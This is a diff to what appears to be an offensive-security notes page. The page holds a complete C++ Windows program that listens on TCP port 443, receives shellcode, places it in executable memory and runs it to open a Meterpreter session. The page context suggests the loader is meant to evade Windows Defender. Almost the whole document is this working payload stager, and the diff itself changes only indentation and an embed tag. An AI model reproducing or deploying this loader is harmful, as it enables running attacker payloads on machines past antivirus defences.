@@ -92,50 +92,48 @@ Why this works? I can only speculate. I am a huge fan of Windows Defender and I 
 
 int main()
 {
-	LPWSADATA wsaData = new WSAData();
-	ADDRINFOA *socketHint = new ADDRINFOA();
-	ADDRINFOA *addressInfo = new ADDRINFOA();
-	SOCKET listenSocket = INVALID_SOCKET;
-	SOCKET clientSocket = INVALID_SOCKET;
-	CHAR bufferReceivedBytes[4096] = {0};
-	INT receivedBytes = 0;
-	PCSTR port = "443";
+    LPWSADATA wsaData = new WSAData();
+    ADDRINFOA *socketHint = new ADDRINFOA();
+    ADDRINFOA *addressInfo = new ADDRINFOA();
+    SOCKET listenSocket = INVALID_SOCKET;
+    SOCKET clientSocket = INVALID_SOCKET;
+    CHAR bufferReceivedBytes[4096] = {0};
+    INT receivedBytes = 0;
+    PCSTR port = "443";
 
-	socketHint->ai_family = AF_INET;
-	socketHint->ai_socktype = SOCK_STREAM;
-	socketHint->ai_protocol = IPPROTO_TCP;
-	socketHint->ai_flags = AI_PASSIVE;
+    socketHint->ai_family = AF_INET;
+    socketHint->ai_socktype = SOCK_STREAM;
+    socketHint->ai_protocol = IPPROTO_TCP;
+    socketHint->ai_flags = AI_PASSIVE;
 
-	WSAStartup(MAKEWORD(2, 2), wsaData);
-	GetAddrInfoA(NULL, port, socketHint, &addressInfo);
+    WSAStartup(MAKEWORD(2, 2), wsaData);
+    GetAddrInfoA(NULL, port, socketHint, &addressInfo);
 
-	listenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);
-	bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
-	listen(listenSocket, SOMAXCONN);
-	std::cout << "Listening on TCP port " << port << std::endl;
+    listenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);
+    bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
+    listen(listenSocket, SOMAXCONN);
+    std::cout << "Listening on TCP port " << port << std::endl;
 
-	clientSocket = accept(listenSocket, NULL, NULL);
-	std::cout << "Incoming connection..." << std::endl;
-	
-	receivedBytes = recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), NULL);
-	if (receivedBytes > 0) {
-		std::cout << "Received shellcode bytes " << receivedBytes << std::endl;
-	}
-	
-	LPVOID shellcode = VirtualAlloc(NULL, receivedBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	std::cout << "Allocated memory for shellocode at: " << shellcode << std::endl;
-	
-	memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));
-	std::cout << "Copied shellcode to: " << shellcode << std::endl << "Sending back meterpreter session...";
-	((void(*)()) shellcode)();
-	
-	return 0;
+    clientSocket = accept(listenSocket, NULL, NULL);
+    std::cout << "Incoming connection..." << std::endl;
+
+    receivedBytes = recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), NULL);
+    if (receivedBytes > 0) {
+        std::cout << "Received shellcode bytes " << receivedBytes << std::endl;
+    }
+
+    LPVOID shellcode = VirtualAlloc(NULL, receivedBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    std::cout << "Allocated memory for shellocode at: " << shellcode << std::endl;
+
+    memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));
+    std::cout << "Copied shellcode to: " << shellcode << std::endl << "Sending back meterpreter session...";
+    ((void(*)()) shellcode)();
+
+    return 0;
 }
 ```
 
 ## References
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/ws2tcpip/nf-ws2tcpip-getaddrinfo" %}
-
-
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/ws2tcpip/nf-ws2tcpip-getaddrinfo" caption="" %}
 
